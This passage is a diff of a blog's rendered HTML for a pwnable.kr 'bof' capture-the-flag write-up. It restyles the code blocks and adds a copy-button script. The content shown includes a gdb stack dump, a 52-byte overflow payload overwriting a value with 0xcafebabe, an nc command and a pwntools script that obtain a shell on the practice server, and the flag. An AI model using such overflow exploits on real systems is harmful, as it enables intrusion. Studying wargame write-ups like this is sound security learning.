-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span><span style="color:#f99b15">0xffffd160</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fad000</span>  <span style="color:#f99b15">0xf7ffdc0c</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span><span style="color:#f99b15">0xffffd170</span>: <span style="color:#f99b15">0xf7ffd000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0xf7fad000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span><span style="color:#f99b15">0xffffd180</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf1272840</span>  <span style="color:#f99b15">0xcca10450</span>  <span style="color:#f99b15">0x00000000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span><span style="color:#f99b15">0xffffd190</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0x00000001</span>  <span style="color:#f99b15">0x56555530</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">14</span><span style="color:#f99b15">0xffffd1a0</span>: <span style="color:#f99b15">0x00000000</span>  <span style="color:#f99b15">0xf7fee5f0</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">1</span><span style="color:#40ffff">$python</span> -c <span style="color:#ed9d13">&#34;print(&#39;A&#39;*52 + &#39;\xbe\xba\xfe\xca&#39;)&#34;</span> &gt; payload
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>(gdb) x/<span style="color:#3677a9">50</span>x <span style="color:#a61717;background-color:#e3d2d2">$</span>esp
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span><span style="color:#3677a9">0xffffd0e0</span>: <span style="color:#3677a9">0xffffd0fc</span>  <span style="color:#3677a9">0xffffd184</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0x0000000d</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#3677a9">0xffffd0f0</span>: <span style="color:#3677a9">0xffffffff</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0xf7e05e18</span>  <span style="color:#3677a9">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span><span style="color:#3677a9">0xffffd100</span>: <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#3677a9">0xffffd110</span>: <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span><span style="color:#3677a9">0xffffd120</span>: <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>  <span style="color:#3677a9">0x41414141</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span><span style="color:#3677a9">0xffffd130</span>: <span style="color:#3677a9">0xcafebabe</span>  <span style="color:#3677a9">0x56555200</span>  <span style="color:#3677a9">0x565556b9</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span><span style="color:#3677a9">0xffffd140</span>: <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7e11286</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span><span style="color:#3677a9">0xffffd150</span>: <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xffffd1e4</span>  <span style="color:#3677a9">0xffffd1ec</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span><span style="color:#3677a9">0xffffd160</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7fad000</span>  <span style="color:#3677a9">0xf7ffdc0c</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span><span style="color:#3677a9">0xffffd170</span>: <span style="color:#3677a9">0xf7ffd000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0xf7fad000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span><span style="color:#3677a9">0xffffd180</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf1272840</span>  <span style="color:#3677a9">0xcca10450</span>  <span style="color:#3677a9">0x00000000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span><span style="color:#3677a9">0xffffd190</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0x00000001</span>  <span style="color:#3677a9">0x56555530</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">14</span><span style="color:#3677a9">0xffffd1a0</span>: <span style="color:#3677a9">0x00000000</span>  <span style="color:#3677a9">0xf7fee5f0</span>
 </code></pre></div><p>Examinng the stack, we see that we have correctly overwritten the value at
 <code>0xffffd130</code> with our desired value <code>0xcafebabe</code>.</p>
 <p>Now we supply our payload to the program running on the server</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#815ba4">$(</span>cat payload; cat<span style="color:#815ba4">)</span> | nc pwnable.kr <span style="color:#f99b15">9000</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>whoami
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span>bof
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>ls
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>bof
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>bof.c
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>flag
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>log
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>log2
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>super.pl
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>cat flag
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>daddy, I just pwned a buFFer :<span style="color:#5bc4bf">)</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#6ab825;font-weight:bold">$(</span>cat payload; cat<span style="color:#6ab825;font-weight:bold">)</span> | nc pwnable.kr <span style="color:#3677a9">9000</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>whoami
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>bof.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>log
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>log2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>super.pl
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>cat flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>daddy, I just pwned a buFFer :)
 </code></pre></div><p>We see that we got a shell on the server. We use cat to hold the shell. We can
 now easily cat the flag!</p>
 <p>We can use a simple python script to get the flag for us:</p>
-<div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span><span style="color:#776e71">#! /usr/bin/python2</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#776e71"># exploit.py</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span><span style="color:#5bc4bf">from</span> <span style="color:#fec418">pwn</span> <span style="color:#5bc4bf">import</span> <span style="color:#5bc4bf">*</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>payload <span style="color:#5bc4bf">=</span> <span style="color:#48b685">&#39;A&#39;</span><span style="color:#5bc4bf">*</span><span style="color:#f99b15">52</span> <span style="color:#5bc4bf">+</span> <span style="color:#48b685">&#39;</span><span style="color:#f99b15">\xbe\xba\xfe\xca</span><span style="color:#48b685">&#39;</span>
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>shell <span style="color:#5bc4bf">=</span> remote(<span style="color:#48b685">&#39;pwnable.kr&#39;</span>, <span style="color:#f99b15">9000</span>)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>shell<span style="color:#5bc4bf">.</span>send(payload)
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>shell<span style="color:#5bc4bf">.</span>interactive()
-</code></pre></div><div class="highlight"><pre style="color:#e7e9db;background-color:#2f1e2e;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 1</span>$./exploit.py 
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 2</span><span style="color:#5bc4bf">[</span>+<span style="color:#5bc4bf">]</span> Opening connection to pwnable.kr on port 9000: Done
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 3</span><span style="color:#5bc4bf">[</span>*<span style="color:#5bc4bf">]</span> Switching to interactive mode
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 4</span>$ ls
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 5</span>$ ls
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 6</span>bof
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 7</span>bof.c
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 8</span>flag
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f"> 9</span>log
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">10</span>log2
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">11</span>super.pl
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">12</span>$ cat flag
-<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#7f7f7f">13</span>daddy, I just pwned a buFFer :<span style="color:#5bc4bf">)</span>
+<div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span><span style="color:#999;font-style:italic">#! /usr/bin/python2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span><span style="color:#999;font-style:italic"># exploit.py</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span><span style="color:#6ab825;font-weight:bold">from</span> <span style="color:#447fcf;text-decoration:underline">pwn</span> <span style="color:#6ab825;font-weight:bold">import</span> *
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>payload = <span style="color:#ed9d13">&#39;A&#39;</span>*<span style="color:#3677a9">52</span> + <span style="color:#ed9d13">&#39;</span><span style="color:#ed9d13">\xbe\xba\xfe\xca</span><span style="color:#ed9d13">&#39;</span>
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>shell = remote(<span style="color:#ed9d13">&#39;pwnable.kr&#39;</span>, <span style="color:#3677a9">9000</span>)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>shell.send(payload)
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>shell.interactive()
+</code></pre></div><div class="highlight"><pre style="color:#d0d0d0;background-color:#202020;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 1</span>$./exploit.py 
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 2</span>[+] Opening connection to pwnable.kr on port 9000: Done
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 3</span>[*] Switching to interactive mode
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 4</span>$ ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 5</span>$ ls
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 6</span>bof
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 7</span>bof.c
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 8</span>flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868"> 9</span>log
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">10</span>log2
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">11</span>super.pl
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">12</span>$ cat flag
+<span style="margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#686868">13</span>daddy, I just pwned a buFFer :)
 </code></pre></div><p>FLAG: daddy, I just pwned a buFFer :)</p>
 
     </div>
@@ -748,6 +748,64 @@ now easily cat the flag!</p>
         
         hasInnerContainers: true,
     });
+</script>
+
+
+/* copy code button */
+<script>
+function addCopyButtons(clipboard) {
+    document.querySelectorAll('pre > code').forEach(function (codeBlock) {
+        var button = document.createElement('button');
+        button.className = 'copy-code-button';
+        button.type = 'button';
+        button.innerText = 'Copy';
+
+        button.addEventListener('click', function () {
+              
+            tmp = codeBlock.innerText.split("\n");
+            cutChar = (tmp.length>8) ? 2 : 1;
+            for(i=0; i<tmp.length; i++){
+              tmp[i] = tmp[i].substring(cutChar);
+            }
+            block = tmp.join("\n");
+            clipboard.writeText(block).then(function () {
+                
+
+                button.blur();
+
+                button.innerText = 'Copied!';
+
+                setTimeout(function () {
+                    button.innerText = 'Copy';
+                }, 2000);
+            }, function (error) {
+                button.innerText = 'Error';
+            });
+        });
+
+        var pre = codeBlock.parentNode;
+        if (pre.parentNode.classList.contains('highlight')) {
+            var highlight = pre.parentNode;
+            highlight.parentNode.insertBefore(button, highlight);
+        } else {
+            pre.parentNode.insertBefore(button, pre);
+        }
+    });
+}
+if (navigator && navigator.clipboard) {
+    addCopyButtons(navigator.clipboard);
+} else {
+    var script = document.createElement('script');
+    script.src = 'https://cdnjs.cloudflare.com/ajax/libs/clipboard-polyfill/2.7.0/clipboard-polyfill.promise.js';
+    script.integrity = 'sha256-waClS2re9NUbXRsryKoof+F9qc1gjjIhc2eT7ZbIv94=';
+    script.crossOrigin = 'anonymous';
+    script.onload = function() {
+        addCopyButtons(clipboard);
+    };
+
+    document.body.appendChild(script);
+}
+
 </script>
 
 
